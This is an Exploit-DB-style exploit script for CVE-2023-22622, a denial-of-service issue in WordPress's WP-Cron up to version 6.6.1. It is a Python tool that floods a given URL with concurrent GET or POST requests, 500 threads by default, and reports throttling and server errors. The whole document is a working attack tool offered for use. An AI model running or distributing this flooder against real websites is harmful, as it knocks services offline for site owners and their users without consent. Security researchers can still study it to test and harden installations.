# Exploit Title: DoS WP-Cron - CVE-2023-22622
# Date: 07/29/2024
# Exploit Author: Michael Fry
# Vendor Homepage: https://wordpress.org/
# Software Link: https://wordpress.org/download/
# Version: Up to (including) 6.6.1
# Tested on: Kali Linux
# CVE : CVE-2023-22622

import argparse
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
import time

# Global variables
request_counter = 0
printed_msgs = []
lock = threading.Lock()

def print_msg(msg):
    """Print message once."""
    with lock:
        if msg not in printed_msgs:
            print(f"\n{msg} after {request_counter} requests")
            printed_msgs.append(msg)

def handle_status_codes(status_code):
    """Handle HTTP status codes."""
    global request_counter
    with lock:
        request_counter += 1
    print(f"\r{request_counter} requests have been sent", end="")

    if status_code == 429:
        print_msg("You have been throttled")
    elif status_code == 500:
        print_msg("Status code 500 received")

def send_request(method, url, payload=None):
    """Send HTTP request and handle response."""
    try:
        if method == "GET":
            response = requests.get(url)
        elif method == "POST":
            response = requests.post(url, data=payload)
        else:
            print("Invalid method specified.")
            return
        handle_status_codes(response.status_code)
    except Exception as e:
        print(f"\nAn error occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description="HTTP Requester")
    parser.add_argument("-m", "--method", choices=['GET', 'POST'], required=True, help="Specify request method")
    parser.add_argument("-u", "--url", required=True, help="Specify the URL")
    parser.add_argument("-d", "--data", default=None, help="Data payload for POST request")
    parser.add_argument("-t", "--threads", type=int, default=500, help="Number of threads to be used")
    args = parser.parse_args()

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for _ in range(args.threads):
            executor.submit(send_request, args.method, args.url, args.data)

    print(f"\nFinished sending requests. Total time: {time.time() - start_time:.2f} seconds")

if __name__ == "__main__":
    main()
